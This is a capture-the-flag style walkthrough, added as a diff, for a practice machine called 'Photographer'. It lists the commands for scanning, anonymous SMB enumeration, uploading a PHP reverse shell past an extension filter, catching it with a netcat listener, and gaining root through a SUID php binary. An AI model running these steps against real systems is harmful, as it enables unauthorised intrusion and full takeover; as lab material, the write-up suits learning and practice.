@@ -1,0 +1,64 @@
+192.168.248.76
+Photographer writup
+Scanning nmap -sV -A --script vuln 192.168.248.76 
+
+SMB Enumeration
+smbclient -L \\\\192.168.x.x
+Access SMB
+smbclient \\\\192.168.x.x\\sambashare (blank password)
+download files
+get mailsent.txt
+get wordpress.bkp.zip
+
+Open .txt file and see content
+I found name , email address and secret
+
+HTTP Enumeration
+Access website on port number 80 (Nothing special)
+Access website on port number 8000
+
+Finding 
+Account name and 
+Website builtin 
+
+Try to access admin directory
+http://192.168.x.x:8000/admin
+put the user name email and secret of password
+Finding: You able to import content lets try to upload php reverse shell
+
+locate php-reverse
+cp copy reverse shell from /usr/share/webshells/php/php-reverse-shell.php in current directory
+As you can see .php not allowed to upload
+
+so rename into shell.php.jpg
+Edit shell.php.jpg
+Edit atttacker IP address and port number
+save it
+
+Start burpsuite proxy and capture iported content
+
+change shell.php.jpg to shell.php
+Start netcat on listening mode
+nc -nvlp 443
+
+To check uploaded file location and access it
+http://192.168.x.x:8000/content/shell/
+
+You will get the reverse shell
+If you want spawn a tty shell then run following command 
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+find SUID 
+find / -perm -u=s -type f 2>/dev/null
+
+our tool which can execute shell is php 
+https://gtfobins.github.io/ (for reference)
+
+Run the command 
+
+
+/usr/bin/php7.2 -r "pcntl_exec('/bin/bash' , ['-p']);"
+now you are root
+cat /root/proof.txt
+
